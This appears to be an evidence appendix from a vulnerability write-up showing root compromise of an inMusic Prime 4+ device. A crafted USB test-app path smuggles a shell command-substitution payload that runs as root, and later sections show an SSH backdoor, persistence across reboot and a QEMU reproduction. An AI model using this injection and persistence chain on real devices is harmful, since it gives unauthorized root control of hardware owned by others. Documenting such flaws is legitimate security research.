# Evidence excerpts

All addresses, serials and LAN details are redacted.

## 1. Launcher match and auto-run (hardware / QEMU)

```
Matching test app version: 1.0.0
Going to run test app from /media/P4PWN/TestAppsCatalog/JC11S/1.0.0/2023.02.11/$(sh${IFS}${PATH%%usr*}media${PATH%%usr*}P4PWN${PATH%%usr*}run.sh).taimg
command starting: az01-signed-fs "/media/P4PWN/.../$(sh${IFS}...).taimg"
az01-signed-fs: failed to open .../.taimg: No such file or directory
Failed to mount signed test app image
```

The mount failure is after the injection; the command substitution already
executed as root.

## 2. Payload run on hardware

```
=== Tue Oct 20 11:22:57 UTC 2026 prime4 usb payload ===
ssh-keygen: generating new host keys: RSA ECDSA ED25519
sshd rc=0
done
```

## 3. Password SSH

```
uid=0(root) gid=0(root) groups=0(root),10(wheel)
Linux prime4plus 6.1.111-inmusic-2024-09-19-rt41 #1 SMP PREEMPT_RT ... armv7l
root:$1$<redacted>:20000:0:99999:7:::
tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN
```

Negative checks:

```
wrong password -> Permission denied, please try again.
pubkey only    -> Permission denied (password).
```

## 4. Persistence after cold reboot

```
$ ssh root@<unit>
uid=0(root) gid=0(root) groups=0(root),10(wheel)
 14:28:56 up 0 min

activate.sh start (pid 287)
root password hash applied
sshd started rc=0
activate.sh done
```

`/data/payload/.armed` contained a different `boot_id` than before the reboot,
confirming the per-boot marker.

## 5. QEMU fresh-container test

Environment: new `debian:bookworm` container, QEMU 7.2.22, Debian
`6.1.0-50-armmp`, 2 vCPUs, DTB with `inmusic,az01` + `JC11S`, shipped USB
image.

```
compatible: inmusic,az01 linux,dummy-virt
product: JC11S
Matching test app version: 1.0.0
...
uid=0(root) ...
Permission denied (password).
```

## 6. external service public API on the unit

```
using client_id <redacted>
track: Flickermood
playing selected stream
```

ALSA isolation:

```
ffmpeg -f lavfi -i sine=... -f alsa plughw:0,0  -> exit 0
```

Local external service HLS playback:

```
external service-resolve -> {"title":"Flickermood","protocol":"hls",...}
hls-local.sh       -> 3:33.89, AAC LC, 44100 Hz, stereo
ffmpeg -i local.mp4 -t 5 -f null -   -> exit 0
ffmpeg -i local.mp4 -t 10 -f alsa plughw:0,0 -> exit 0, 1723 KiB audio
```

The track was audible on the Prime 4+ output. Engine was stopped for the
playback test and restarted afterward; the signed rootfs remained mounted
read-only.
